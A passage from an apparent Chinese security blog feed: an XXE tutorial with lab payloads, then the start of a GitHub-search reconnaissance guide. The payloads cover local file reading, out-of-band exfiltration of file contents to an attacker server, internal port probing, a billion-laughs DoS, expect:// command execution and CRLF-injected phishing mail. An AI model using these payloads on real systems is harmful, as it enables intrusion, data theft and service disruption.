class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p><strong>重点一：</strong></p><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p><strong>重点二：</strong></p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><h3 id="XXE攻击手段汇总"><a href="#XXE攻击手段汇总" class="headerlink" title="XXE攻击手段汇总"></a>XXE攻击手段汇总</h3><p>首先复现需要用到的项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;xxe-lab</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/2.png?raw=true" alt="image-20200724095320602"></p><p>首先搭建好环境后我们尝试抓包</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/3.png?raw=true" alt="image-20200724095301738"></p><p>可以看到类似标签页信息，如果没有下面的请求头的话可以添加这个头，这样可以让服务器试着解析XML格式，这边是直接存在这个请求头，就不需要添加了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*;</span><br></pre></td></tr></table></figure><p>然后在POS包里面添加XML文档，需要使用<code>&amp;xxe;</code>来引用上面的XXE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe &quot;ascotbe&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/4.png?raw=true" alt="image-20200724100320554"></p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><h5 id="有回显方法"><a href="#有回显方法" class="headerlink" title="有回显方法"></a>有回显方法</h5><p>使用以下POC即可读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/5.png?raw=true" alt="image-20200724100524209"></p><h5 id="无回显方法"><a href="#无回显方法" class="headerlink" title="无回显方法"></a>无回显方法</h5><p>如果直接执行的话是没有任何回显的。可以使用http协议将请求发送到远程服务器上，从而获取文件内容。</p><p>首先在远程服务器写入一个<code>test.dtd</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;?%file;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>然后在目标机器上发送payload来加载它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/6.png?raw=true" alt="image-20200724110415203"></p><p>然后服务器上面就能收到内容了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/7.png?raw=true" alt="image-20200724110442580"></p><p>解密下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/8.png?raw=true" alt="image-20200724110531774"></p><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><p>相关语言可以使用的协议</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/9.png?raw=true" alt="img"></p><p>使用以下POC来探测目标主机，所开的端口，也可以写个python脚本跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE ANY [</span><br><span class="line">        &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.0.161:8000&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>如果内网有服务会有响应，就算是无回显的XXE的话也会返回数据包过来</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/10.png?raw=true" alt="image-20200724110702674"></p><p>如果内网无这个服务的话就会超时不会返回任何东西</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/XXE/11.png?raw=true" alt="image-20200724110916397"></p><h4 id="DOS炸弹💣"><a href="#DOS炸弹💣" class="headerlink" title="DOS炸弹💣"></a>DOS炸弹💣</h4><p>之前有篇DOS炸弹的文章有讲过这是其中的一种XML的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line"> &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>当XML解析器加载这个文档时，他会看到它包含一个包含文本<code>&amp;lol9;</code>的根元素,不过<code>&amp;lol9;</code>是一个定义的实体,扩展包含十个<code>&amp;lol8;</code>的字符串,每个<code>&amp;lol8;</code>是一个定义的实体，扩展为十个<code>&amp;lol7;</code>的字符串。因为许多XML解释器在解析XML文档时倾向于将它的整个结果保存在内存中，所以这个不到1kb的xml文件实际包含10亿个lol,占用几乎3GB的内存，造成DDOS攻击。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>PHP环境下,xml命令执行要求php装有expect扩展。该扩展默认没有安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;except:&#x2F;&#x2F;ipconfig&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h4><blockquote><p>该方法没有试验过，先看大佬文章记录下</p></blockquote><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a%0D%0A</span><br><span class="line">EHLO%20a%0D%0A</span><br><span class="line">MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A</span><br><span class="line">RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A</span><br><span class="line">DATA%0D%0A</span><br><span class="line">From%3A%20support%40VULNERABLESYSTEM.com%0A</span><br><span class="line">To%3A%20victim%40gmail.com%0A</span><br><span class="line">Subject%3A%20test%0A</span><br><span class="line">%0A</span><br><span class="line">test!%0A</span><br><span class="line">%0D%0A</span><br><span class="line">.%0D%0A</span><br><span class="line">QUIT%0D%0A</span><br><span class="line">:a@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;a</span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;</span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http:&#x2F;&#x2F;PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><blockquote><p>该方法没有试验过，先看大佬文章记录下</p></blockquote><p><strong>jar:// 协议的格式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>大概的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3357</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集总结</title>
    <link href="https://www.ascotbe.com/2020/07/23/InformationGathering/"/>
    <id>https://www.ascotbe.com/2020/07/23/InformationGathering/</id>
    <published>2020-07-23T13:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>对没错这是这星期的第三篇文章了，目前只写了个GitHub的使用方法，等周六周天补充吧</p><h2 id="Github搜索语法"><a href="#Github搜索语法" class="headerlink" title="Github搜索语法"></a>Github搜索语法</h2><p>众所周知，GitHub就是信息泄露的宝库之一，用好语法天天高危来敲你家门（逃</p><h3 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h3><h4 id="查询大于或小于另一个值的值"><a href="#查询大于或小于另一个值的值" class="headerlink" title="查询大于或小于另一个值的值"></a>查询大于或小于另一个值的值</h4><p>您可以使用<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，和<code>&lt;=</code>搜索是大于，大于或等于，小于和小于或等于另一个值的值。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>&gt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3E1000&type=Repositories">cats stars:&gt;1000</a></strong> 匹配含有 “cats” 字样、星标超过 1000 个的仓库。</td></tr><tr><td><code>&gt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+topics:%3E=5&type=Repositories">cats topics:&gt;=5</a></strong> 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。</td></tr><tr><td><code>&lt;n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+size:%3C10000&type=Code">cats size:&lt;10000</a></strong> 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。</td></tr><tr><td><code>&lt;=n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%3C=50&type=Repositories">cats stars:&lt;=50</a></strong> 匹配含有 “cats” 字样、星标不超过 50 个的仓库。</td></tr><tr><td><code>n..*</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..*&type=Repositories">cats stars:10..*</a></strong> 等同于 <code>stars:&gt;=10</code> 并匹配含有 “cats” 字样、有 10 个或更多星号的仓库。</td></tr><tr><td><code>*..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:%22*..10%22&type=Repositories">cats stars:*..10</a></strong> 等同于 <code>stars:&lt;=10</code> 并匹配含有 “cats” 字样、有不超过 10 个星号的仓库。</td></tr></tbody></table><h4 id="查询范围之间的值"><a href="#查询范围之间的值" class="headerlink" title="查询范围之间的值"></a>查询范围之间的值</h4><p>您可以使用范围语法 <code>n..n</code> 搜索范围内的值，其中第一个数字 <em>n</em> 是最低值，而第二个是最高值。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>n..n</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+stars:10..50&type=Repositories">cats stars:10..50</a></strong> 匹配含有 “cats” 字样、有 10 到 50 个星号的仓库。</td></tr></tbody></table><h4 id="查询日期"><a href="#查询日期" class="headerlink" title="查询日期"></a>查询日期</h4><p>您可以通过使用 <code>&gt;</code>、<code>&gt;=</code>、<code>&lt;</code>、<code>&lt;=</code> 和范围查询搜索早于或晚于另一个日期，或者位于日期范围内的日期。 日期格式必须遵循 <a href="http://en.wikipedia.org/wiki/ISO_8601">ISO8601</a>标准，即 <code>YYYY-MM-DD</code>（年-月-日）。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>&gt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E2016-04-29&type=Issues">cats created:&gt;2016-04-29</a></strong> 匹配含有 “cats” 字样、在 2016 年 4 月 29 日之后创建的议题。</td></tr><tr><td><code>&gt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3E=2017-04-01&type=Issues">cats created:&gt;=2017-04-01</a></strong> 匹配含有 “cats” 字样、在 2017 年 4 月 1 日或之后创建的议题。</td></tr><tr><td><code>&lt;YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?q=cats+pushed:%3C2012-07-05&type=Code&utf8=%E2%9C%93">cats pushed:&lt;2012-07-05</a></strong> 匹配在 2012 年 7 月 5 日之前推送的仓库中含有 “cats” 字样的代码。</td></tr><tr><td><code>&lt;=YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:%3C=2012-07-04&type=Issues">cats created:&lt;=2012-07-04</a></strong> 匹配含有 “cats” 字样、在 2012 年 7 月 4 日或之前创建的议题。</td></tr><tr><td><code>YYYY-MM-DD..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+pushed:2016-04-30..2016-07-04&type=Repositories">cats pushed:2016-04-30..2016-07-04</a></strong> 匹配含有 “cats” 字样、在 2016 年 4 月末到 7 月之间推送的仓库。</td></tr><tr><td><code>YYYY-MM-DD..</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2012-04-30..*&type=Issues">cats created:2012-04-30..*</a></strong> 匹配在 2012 年 4 月 30 日之后创建、含有 “cats” 字样的议题。</td></tr><tr><td><code>..YYYY-MM-DD</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:*..2012-07-04&type=Issues">cats created:*..2012-04-30</a></strong> 匹配在 2012 年 7 月 4 日之前创建、含有 “cats” 字样的议题。</td></tr></tbody></table><p>您也可以在日期后添加可选的时间信息 <code>THH:MM:SS+00:00</code>，以便按小时、分钟和秒进行搜索。 这是 <code>T</code>，随后是 <code>HH:MM:SS</code>（时-分-秒）和 UTC 偏移 (<code>+00:00</code>)。</p><table><thead><tr><th>查询</th><th>示例</th></tr></thead><tbody><tr><td><code>YYYY-MM-DDTHH:MM:SS+00:00</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00&type=Issues">cats created:2017-01-01T01:00:00+07:00..2017-03-01T15:30:15+07:00</a></strong> 匹配在 2017 年 1 月 1 日凌晨 1 点（UTC 偏移为 <code>07:00</code>）与 2017 年 3 月 1 日下午 3 点（UTC 偏移为 <code>07:00</code>）之间创建的议题。</td></tr><tr><td><code>YYYY-MM-DDTHH:MM:SSZ</code></td><td><strong><a href="https://github.com/search?utf8=%E2%9C%93&q=cats+created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z&type=Issues">cats created:2016-03-21T14:11:00Z..2016-04-07T20:45:00Z</a></strong> 匹配在 2016 年 3 月 21 日下午 2:11 与 2016 年 4 月 7 日晚上 8:45 之间创建的议题。</td></tr></tbody></table><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p>您可以使用 <code>NOT</code> 语法排除包含特定字词的结果。 <code>NOT</code> 运算符只能用于字符串关键词， 不适用于数字或日期。</p><table><thead><tr><th align="left">查询</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>NOT</code></td><td align="left"><strong><a href="https://github.com/search?q=hello+NOT+world&type=Repositories">hello NOT world</a></strong> 匹配含有 “hello” 字样但不含有 “world” 字样的仓库。</td></tr></tbody></table><p>还可以使用包括<code>AND</code>、<code>OR</code>运算符</p><h4 id="排除运算符"><a href="#排除运算符" class="headerlink" title="排除运算符"></a>排除运算符</h4><p>缩小搜索结果范围的另一种途径是排除特定的子集。 您可以为任何搜索限定符添加 